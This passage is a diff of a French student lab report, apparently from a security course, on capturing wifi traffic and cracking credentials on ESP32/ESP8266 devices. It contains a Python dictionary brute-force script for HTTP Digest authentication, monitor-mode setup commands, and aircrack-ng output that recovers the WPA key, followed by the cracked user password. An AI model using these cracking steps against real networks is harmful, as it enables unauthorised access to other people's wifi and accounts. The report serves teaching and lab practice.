@@ -489,7 +489,7 @@ Verification de la validité d'un couple USER/PWD
 En ce basant sur le cours et la page Wikipedia fourni, voici mon
 "programe":
 
--   ``` {#code/AuthDigest/digest_auth.sh .bash caption="Digest Auth" label="code/AuthDigest/digest_auth.sh" style="Style1"}
+-   ``` {#manip/digest_auth.sh .bash caption="Digest Auth" label="manip/digest_auth.sh" style="Style1"}
     #!/bin/bash
     #Authorization: Digest
     username="toto"
@@ -565,3 +565,214 @@ Tous d'abord, on doit trouver le mots de passes de l'AP :
 
           EAPOL HMAC     : A2 CA 6F 69 CB D9 86 80 E3 EC 64 01 D1 47 71 12 
     ```
+
+On peut ainsi récuperer les informations de connactions dans la trame de
+connection:
+
+![Ajoute de la Clé dans
+wireshark[]{label="fig:net "}](image/7.jpg){#fig:net }
+
+Nous avons donc toutes les informations pour brute Force le mot de
+passe. Nous allons utiliser le meme code qui vérifier la validité du mot
+de passe réecrie en Python pour des raisons de rapidités:
+
+-   ``` {#manip/digest_authAP2.py .python caption="digest authentification python" label="manip/digest_authAP2.py" style="Style1"}
+    import hashlib
+    username="alice"
+    realm="ESP32 Auth Realm"
+    nonce="f71c1a0ee32fe388c45caf821405f2be"
+    uri="/login"
+    cnonce="ZmIxYjU2ZmZjMzYyZWM2NzhkYThhOTAzYjI2N2NlMGE="
+    nc="00000001"
+    qop="auth"
+    response="8c806a5a42f69c674ccbaa7e8de87b4a"
+    opaque="0eccb6e4b80a9ea569a5a5b5984dc185"
+
+
+    with open('dico.txt', 'r') as mon_dico:
+        for line in mon_dico:
+            mdp = str(line)[:-1]
+            hash1 = username+":"+realm+":"+mdp
+            hash11 = hashlib.md5(hash1.encode())
+            hash111 = hash11.hexdigest()
+            #--------#
+            hash2 = "GET:"+uri
+            hash22 = hashlib.md5(hash2.encode())
+            hash222 = hash22.hexdigest()
+            #--------#
+            hash3 = hash111+":"+nonce+":"+nc+":"+cnonce+":"+qop+":"+hash222
+            hash33 = hashlib.md5(hash3.encode())
+            hash333= hash33.hexdigest()
+            #print(" result :"+hash333)
+            #--------#
+            if hash333==response:
+                print("Right Login/Password : "+mdp)
+                break
+     #       else:
+    #            print("||||"+mdp+"|||||")
+
+
+
+
+
+
+    ```
+
+Reproduction sur une vrai puce en fonctionnement
+------------------------------------------------
+
+Donc on determine le channel de la puce et on configure notre carte wifi
+en mode monitor sur le bon channel:
+
+-   ``` {#code/puce/1 caption="Setup" label="code/puce/1" style="Style1"}
+    [root@MiniZbeub]/home/slaynpool/Documents/IDO/SECO/manip# ifconfig wlp0s20f0u1u1u2 down 
+    [root@MiniZbeub]/home/slaynpool/Documents/IDO/SECO/manip# iwconfig wlp0s20f0u1u1u2 mode managed
+    [root@MiniZbeub]/home/slaynpool/Documents/IDO/SECO/manip# ifconfig wlp0s20f0u1u1u2 up 
+    [root@MiniZbeub]/home/slaynpool/Documents/IDO/SECO/manip# iw wlp0s20f0u1u1u2 scan |grep cbIDO2 -B 10 -A 15
+    		 * VI: CW 7-15, AIFSN 2, TXOP 3008 usec
+    		 * VO: CW 3-7, AIFSN 2, TXOP 1504 usec
+    BSS 5e:cf:7f:1b:74:2f(on wlp0s20f0u1u1u2)
+    	TSF: 13731867829 usec (0d, 03:48:51)
+    	freq: 2422
+    	beacon interval: 100 TUs
+    	capability: ESS Privacy (0x0011)
+    	signal: -45.00 dBm
+    	last seen: 760 ms ago
+    	Information elements from Probe Response frame:
+    	SSID: cbIDO2
+    	Supported rates: 5.5* 11.0* 1.0* 2.0* 6.0 12.0 24.0 48.0 
+    	DS Parameter set: channel 3
+    	Country: CN	Environment: bogus
+    		Channels [1 - 13] @ 20 dBm
+    	Extended supported rates: 54.0 9.0 18.0 36.0 
+    	RSN:	 * Version: 1
+    		 * Group cipher: TKIP
+    		 * Pairwise ciphers: CCMP TKIP
+    		 * Authentication suites: PSK
+    		 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
+    BSS 24:0a:c4:1d:3a:d9(on wlp0s20f0u1u1u2)
+    	TSF: 3423258760 usec (0d, 00:57:03)
+    	freq: 2457
+    	beacon interval: 100 TUs
+    	capability: ESS Privacy ShortPreamble ShortSlotTime (0x0431)
+    [root@MiniZbeub]/home/slaynpool/Documents/IDO/SECO/manip# ifconfig wlp0s20f0u1u1u2 down 
+    [root@MiniZbeub]/home/slaynpool/Documents/IDO/SECO/manip# iwconfig wlp0s20f0u1u1u2 mode monitor
+    [root@MiniZbeub]/home/slaynpool/Documents/IDO/SECO/manip# ifconfig wlp0s20f0u1u1u2 up 
+    [root@MiniZbeub]/home/slaynpool/Documents/IDO/SECO/manip# iw wlp0s20f0u1u1u2 set channel 3
+    ```
+
+On fait une capture de trame pendant une connexion à l'AP et au site
+sécuriser, au moins nous n'aurons pas à refaire de capture de trame:
+
+![Capture[]{label="fig:net "}](image/8.jpg){#fig:net }
+
+On utilise AirCrack-ng:
+
+-   ``` {#code/puce/2 caption="AirCrack" label="code/puce/2" style="Style1"}
+    [slaynpool@MiniZbeub]puce$ aircrack-ng -w ../dico.txt Cpt.pcap 
+    Reading packets, please wait...
+    Opening Cpt.pcap
+    Read 1774 packets.
+       #  BSSID              ESSID                     Encryption
+
+       1  00:3A:99:2B:1D:40                            Unknown
+       2  00:3A:9A:24:58:E0                            Unknown
+       3  00:3A:9A:24:58:E3  IUTBEZIERS                Unknown
+       4  00:3A:9A:24:58:E5  eduroam                   Unknown
+       5  00:3A:9A:24:58:E6                            Unknown
+       6  00:3A:9A:F4:2C:D0                            Unknown
+       7  24:0A:C4:1D:1A:59  xxxxxxxx                  Unknown
+       8  24:0A:C4:1D:2B:39  cestquoilecode            WPA (0 handshake)
+       9  24:0A:C4:1D:37:4D  floflo                    Unknown
+      10  24:0A:C4:1D:3A:D9  habibi                    WPA (0 handshake)
+      11  24:0A:C4:1D:46:51  Skrr                      Unknown
+      12  24:0A:C4:1D:49:A5  Cookie                    Unknown
+      13  24:0A:C4:1D:4B:E1  Durel                     Unknown
+      14  5E:CF:7F:1B:74:2F  cbIDO2                    WPA (1 handshake)
+      15  D2:53:DA:05:04:28                            WEP (1 IVs)
+    Index number of target network ? 14
+    Reading packets, please wait...
+    Opening Cpt.pcap
+    Read 1774 packets.
+    1 potential targets
+                             Aircrack-ng 1.6 rev e708c21e
+
+          [00:02:14] 1092856/1814400 keys tested (8301.35 k/s) 
+
+          Time left: 1 minute, 26 seconds                           60.23%
+
+                               KEY FOUND! [ 61495327 ]
+
+
+          Master Key     : D0 A2 CB DF CB 06 20 13 EC BC F1 41 74 E5 61 C7 
+                           45 CE 3A 9A 69 7A EC 1C DB 40 B5 78 A0 82 FB F9 
+
+          Transient Key  : 45 D5 4A AB 74 51 2F 77 B3 31 F6 5B A4 B6 1B AF 
+                           D8 D4 1F 41 54 AF B4 BB DF 0F 65 A5 C7 ED 04 B7 
+                           CB CB CE BA 80 8A C9 34 AE FA 74 58 A3 A4 67 03 
+                           3B 48 88 CE 92 31 C3 0A D8 5E 7C 10 05 0E DE DA 
+
+          EAPOL HMAC     : D6 E0 B8 41 AC 91 0F 52 0E 0A EC 81 A4 C5 EB E6 
+    ```
+
+On décrypte les trames avec wireshark :
+
+![Trame HTTP[]{label="fig:net "}](image/9.jpg){#fig:net }
+
+On Brute force avec mon programme python en modifiant les variables par
+celle trouvé dans la capture:
+
+-   ``` {#manip/puce/digest_authAP2.py .python caption="Le code est 65983241" label="manip/puce/digest_authAP2.py" style="Style1"}
+    import hashlib
+    #GET /login HTTP/1.1
+    #Authorization: Digest 
+    username="john"
+    realm="ESP8266 IDO Auth Realm"
+    nonce="697e2220a3e76ed724cedc2c08769807"
+    uri="/login"
+    cnonce="YTRlYzhkZjg4MWViMTNhMTMyYmViZmY1MWFhMmNlZjY="
+    nc="00000001"
+    qop="auth"
+    response="c32fc78154711b36ef2239c815ad6c7a"
+    opaque="381c3490d37cf068825bbab96fe716d1"
+
+
+
+
+
+
+    with open('dico.txt', 'r') as mon_dico:
+        for line in mon_dico:
+            mdp = str(line)[:-1]
+            hash1 = username+":"+realm+":"+mdp
+            hash11 = hashlib.md5(hash1.encode())
+            hash111 = hash11.hexdigest()
+            #--------#
+            hash2 = "GET:"+uri
+            hash22 = hashlib.md5(hash2.encode())
+            hash222 = hash22.hexdigest()
+            #--------#
+            hash3 = hash111+":"+nonce+":"+nc+":"+cnonce+":"+qop+":"+hash222
+            hash33 = hashlib.md5(hash3.encode())
+            hash333= hash33.hexdigest()
+            #print(" result :"+hash333)
+            #--------#
+            if hash333==response:
+                print("Right Login/Password : "+mdp)
+                break
+     #       else:
+    #            print("||||"+mdp+"|||||")
+
+    #---------STDOUT---------#
+    #[slaynpool@MiniZbeub]puce$ python digest_authAP2.py 
+    #Right Login/Password : 65983241
+    #---------STDOUT---------#
+
+
+
+    ```
+
+Donc, nous savons à present que le mot de passe nessacaire pour ce
+connecter à l'AP est : 61495327\
+Le nom d'utilisateur est : john (On le sais grace à la trame HTTP)\
+Et que le mot de passe de john est : 65983241\
